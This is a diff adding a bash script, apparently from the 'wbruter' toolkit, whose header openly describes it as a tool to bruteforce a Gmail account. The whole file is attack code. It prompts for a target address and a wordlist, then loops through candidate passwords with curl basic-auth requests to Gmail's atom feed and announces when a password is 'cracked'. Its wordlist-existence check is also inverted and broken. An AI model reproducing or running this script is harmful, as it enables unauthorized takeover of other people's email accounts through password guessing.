@@ -1,0 +1,114 @@
+#!/bin/bash
+##################################################################################
+##### LICENSE ####################################################################
+##################################################################################
+####                                                                          ####
+#### Copyright (C) 2018 wuseman <info@sendit.nu>                              ####
+####                                                                          ####
+#### This program is free software: you can redistribute it and/or modify     ####
+#### it under the terms of the GNU General Public License as published by     ####
+#### the Free Software Foundation, either version 3 of the License, or        ####
+#### (at your option) any later version.                                      ####
+####                                                                          ####
+#### This program is distributed in the hope that it will be useful,          ####
+#### but WITHOUT ANY WARRANTY; without even the implied warranty of           ####
+#### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            ####
+#### GNU General Public License at <http://www.gnu.org/licenses/> for         ####
+#### more details.                                                            ####
+####                                                                          ####
+##################################################################################
+##### GREETINGS ##################################################################
+##################################################################################
+####                                                                          ####
+#### To all developers that contributes to all kind of open source projects   ####
+#### Keep up the good work!                                                   #<3#
+####                                                                          ####
+#### https://sendit.nu & https://github.com/wuseman                           ####
+####                                                                          ####
+##################################################################################
+#### DESCRIPTION #################################################################
+##################################################################################
+####                                                                          ####
+#### This is a minimal tool written in bash by wuseman to bruteforce attack   ####
+#### a gmail account                                                          ####
+####                                                                          ####
+#### Enjoy another awesome 'bash' script from wuseman. Questions? Conact me!  ####
+####                                                                          ####
+##################################################################################
+#### Begin of code  ##############################################################
+##################################################################################
+
+help() {
+
+echo -e "      \n$(basename "$0") gmail -- bruteforce attack an gmail account\n"
+}
+
+
+
+   if [ -z "$1" ]; then
+       help
+    exit
+   fi
+
+   echo -e "\e[0;1m[-]\e[0m                                                                                       "
+   echo -e "\e[0;1m[-] \e[4mPlease Enter your Mail & Wordlist\e[0m                                                     "
+   echo -e "\e[0;1m[-]\e[0m                                                                                       "
+read -p $'\e[0;1m[-] Gmail: ' mail
+read -p $'\e[0;1m[-] Wordlist: ' wordlist
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+echo -e "\e[1;37m[-]\e[0m ---------------------------------------------------------------------------------------"
+   echo -e "\e[1;37m[-] \e[1;37m\e[4mInfo:\e[0m\e[0m"
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+   echo -e "\e[1;37m[-]\e[0m \e[0;1mYour current ip is: xx.xx.xx.xx(removed in preview)"
+#\e[1;32m$(curl -s https://sendit.nu/i/)\e[0m"
+   echo -e "\e[1;37m[-]\e[0m \e[0;1mMail to attack:\e[0m \e[1;32m$mail\e[0m"
+   echo -e "\e[1;37m[-]\e[0m\e[1;37m Wordlist To Use:\e[0m \e[1;32m$(pwd)/$wordlist\e[0m"
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+  read -p $'\e[1;37m[-]\e[0m \e[1;37mAre you ready to start the attack: (\e[1;32myes\e[0m/\e[1;31mno\e[0m): ' correctinfo
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+echo -e "\e[1;37m[-]\e[0m ---------------------------------------------------------------------------------------"
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+ if [ $correctinfo = "yes" ]; then
+   echo -e "\e[1;37m[-] \e[0;1m\e[1;37mBruteforce attack will be started within 2 seconds..\n\e[0;1m[-] Please use (CTRL+C) to abort the attack at anytime..\e[0m"
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+  if [ -f "wordlist" ]; then
+            echo -e "\e[1;37m[-] \e[1;37m\e"
+   echo -e "\e[1;37m[-]\e[0m Eh, there is no such wordlist you provided...Aborting.." 
+   echo -e "\e[1;37m[-] \e[1;37m\e"
+echo -e "\e[1;37m[-]\e[0m ---------------------------------------------------------------------------------------"
+sleep 2
+   exit
+   fi
+while read -r line
+ do
+    name="$line"
+    attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"
+  if [ -z "$attack" ]; then
+      echo -e "\e[1;37m[-] \e[0;1mWrong Password for $mail: \e[1;31m$name\e[0m"
+      sleep 1
+  fi
+
+  if [ -n "$attack" ]; then
+    echo -e "\e[1;37m[-] \e[1;37m\e"
+
+echo -e "\e[1;32m[+]\e[0m ---------------------------------------------------------------------------------------"
+   echo -e             "\e[1;32m[+] \e[1;37m\e"
+   echo -e             "\e[1;32m[+]\e[0m\e[0;1m Password Has Been Successfully Cracked: $name"
+   echo -e             "\e[1;32m[+] \e[1;37m\e"
+echo -e "\e[1;32m[+]\e[0m ---------------------------------------------------------------------------------------"
+
+      exit
+  fi
+ done < "$wordlist"
+echo -e "\e[1;37m[-]\e[0m "
+
+   echo -e              "\e[1;31m[-]\e[0m Sorry, no passwords in \e[0;1m$wordlist\e[0m matched \e[0;1m$mail\e[0m current password. "
+   echo -e              "\e[1;31m[-]\e[0m Try your luck with another \e[0;1mwordlist\e[0m instead..."
+echo -e "\e[1;37m[-]\e[0m "
+
+echo ""
+exit
+else
+   echo "\nAborting.. Please run 'wbruter gmail' again\n"
+ fi
+
